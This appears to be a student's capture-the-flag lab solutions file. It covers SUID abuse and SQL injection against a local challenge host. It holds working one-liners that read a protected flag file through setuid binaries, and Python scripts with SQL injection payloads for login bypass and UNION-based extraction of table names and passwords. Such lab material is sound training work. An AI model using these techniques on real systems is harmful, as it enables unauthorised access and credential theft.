# Lab 2

## SUID Exploitation

* Level 16

split /flag

cat xaa


* Level 21 

ar r inter /flag

cat inter

* Level 30 

setarch --uname-2.6 cat /flag

## SQLi 

* Level 3 

import requests 

URL = "http://challenge.localhost:80/?user=1" 

r = requests.get(url = URL) 

print(r.content)

* Level 4

import requests 

form = { "username" : 'flag" --', "password" : "idk", } 

response = requests.post("http://challenge.localhost/", data=form) 

print(response,"\n",response.text)

* Level 6

import requests 

params = {"query": '" UNION SELECT tbl_name from sqlite_master --'} 

response = requests.post("http://challenge.localhost/", params=params) 

t_name = response.text.strip()

params = {"query": f'" UNION SELECT password from {t_name} --' }

response = requests.post("http://challenge.localhost/", params=params) 

print(response.text.strip())